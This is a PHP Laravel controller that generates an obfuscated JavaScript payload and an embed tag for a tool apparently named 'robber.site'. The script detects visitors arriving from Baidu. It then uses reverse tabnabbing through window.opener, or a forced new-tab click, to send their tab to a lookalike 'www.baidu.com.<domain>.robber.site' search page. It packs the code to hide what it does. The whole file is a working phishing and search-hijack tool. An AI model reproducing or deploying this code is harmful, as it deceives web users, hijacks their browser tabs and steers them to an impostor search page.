<?php

namespace App\Http\Controllers;

use App\ExtraClasses\JavaScriptPacker;

class JsController extends Controller {
	public function js($website_id) {

		$website = \DB::table('websites')->find($website_id);
		$keyword = \DB::table('keywords')->where('website_id', $website_id)->first();

		if (!isset($keyword)) {
			return view('js', ['js' => '请设置站点<a href="' . url('/website/' . $website->id . '/keyword') . '">关键词</a>']);
		}

		$js = 'if(window.opener){
        	if(document.referrer.indexOf("baidu.com") != -1 && document.referrer.indexOf("robber.site") == -1){
                window.opener.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
        	}
		}else{
        	if(document.referrer.indexOf("baidu.com") != -1){
		        a = document.createElement("a");
		        a.href = "' . $website->url . '";
		        a.target = "_blank";
		        a.click();
                window.location.href = "http://www.baidu.com.' . $website->domain . '.robber.site/s?wd=' . $keyword->keyword_default . '";
        	}
		}';

		$packer = new JavaScriptPacker($js, 'Normal', true, false);
		$packed = $packer->pack();

		\Storage::disk('js')->put(md5($website_id) . '.js', $packed);

		return view('js', ['js' => e('<script type="text/javascript" src="http://www.robber.site/js/' . md5($website_id) . '.js' . '"></script>')]);
	}
}
